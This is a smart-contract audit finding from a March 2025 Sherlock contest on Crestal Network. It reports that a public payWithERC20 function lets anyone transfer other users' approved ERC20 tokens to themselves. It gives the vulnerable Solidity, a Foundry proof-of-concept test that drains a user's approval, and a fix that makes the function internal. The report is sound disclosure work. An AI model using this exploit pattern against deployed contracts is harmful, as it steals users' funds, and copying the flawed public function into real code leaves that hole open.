# Arbitrary transfer from in public function `Payment::payWithERC20` allows an attacker to steal approved funds

**Crestal Network**, Sherlock, March 2025, judged **High**, contest rank 12th  
Contest page: https://audits.sherlock.xyz/contests/755  
Credited on H-1 in the judging summary: https://github.com/sherlock-audit/2025-03-crestal-network-judging  
Submission in the judging repo, under Sherlock's anonymous name Stale Hotpink Kitten: https://github.com/sherlock-audit/2025-03-crestal-network-judging/issues/48

This is the submission I sent in.

---
### Summary

The public function [`Payment::payWithERC20`](https://github.com/sherlock-audit/2025-03-crestal-network/blob/main/crestal-omni-contracts/src/Payment.sol#L25) is used in [`BlueprintCore`](https://github.com/sherlock-audit/2025-03-crestal-network/blob/main/crestal-omni-contracts/src/BlueprintCore.sol#L756) to pay fees to the `feeCollectionWalletAddress`, however since the function is public and uses arbitrary from in the [`safeTransferFrom`](https://github.com/sherlock-audit/2025-03-crestal-network/blob/main/crestal-omni-contracts/src/Payment.sol#L31), anyone can send approved tokens to themselves. 

```solidity
    function payWithERC20(address erc20TokenAddress, uint256 amount, address fromAddress, address toAddress) public {
        // check from and to address
        require(fromAddress != toAddress, "Cannot transfer to self address");
        require(toAddress != address(0), "Invalid to address");
        require(amount > 0, "Amount must be greater than 0");
        IERC20 token = IERC20(erc20TokenAddress);
        token.safeTransferFrom(fromAddress, toAddress, amount);
    }

```

### Root Cause

The function [`Payment::payWithERC20`](https://github.com/sherlock-audit/2025-03-crestal-network/blob/main/crestal-omni-contracts/src/Payment.sol#L25) is public and includes an unchecked arbitrary from in the [safeTransferFrom](https://github.com/sherlock-audit/2025-03-crestal-network/blob/main/crestal-omni-contracts/src/Payment.sol#L31). Since it is public, it is callable by anyone.

### Internal Pre-conditions

Can happen at any time with any approved tokens

### External Pre-conditions

1. A user approves tokens to the blueprint contract

### Attack Path

1. A user approves the blueprint contract to spend their tokens
2. The attacker sends the users approved tokens to themself before the user can use them

### Impact

Users loose all of their approved tokens since [`Payment::payWithERC20`](https://github.com/sherlock-audit/2025-03-crestal-network/blob/main/crestal-omni-contracts/src/Payment.sol#L25) is callable by anyone

### PoC

Add the following test to `BlueprintV5.t.sol`

```solidity
    function test_anyoneCanStealApprovedTokens() public {
        address user = makeAddr("user");
        address attacker = makeAddr("attacker");

        uint256 topUpAmount = 100 * 10 ** 18;

        // Setup
        blueprint.addPaymentAddress(address(mockToken));
        mockToken.mint(user, topUpAmount);

        // 1. The user approves the blueprint contract to spend tokens
        vm.prank(user);
        mockToken.approve(address(blueprint), topUpAmount);

        // 2. The attacker sends the users approved tokens to themself before the user can use them
        vm.prank(attacker);
        blueprint.payWithERC20(address(mockToken), topUpAmount, user, attacker);

        uint256 balanceUser = mockToken.balanceOf(user);
        uint256 balanceAttacker = mockToken.balanceOf(attacker);
        assertEq(balanceUser, 0);
        assertEq(balanceAttacker, topUpAmount);
    }
```

```solidity
[PASS] test_anyoneCanStealApprovedTokens() (gas: 151979)
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.67ms (338.75µs CPU time)
```

### Mitigation

Make the [`Payment::payWithERC20`](https://github.com/sherlock-audit/2025-03-crestal-network/blob/main/crestal-omni-contracts/src/Payment.sol#L25) contract internal so that it can't be called by external users.

```diff
- function payWithERC20(address erc20TokenAddress, uint256 amount, address fromAddress, address toAddress) public {

+ function payWithERC20(address erc20TokenAddress, uint256 amount, address fromAddress, address toAddress) internal {

```
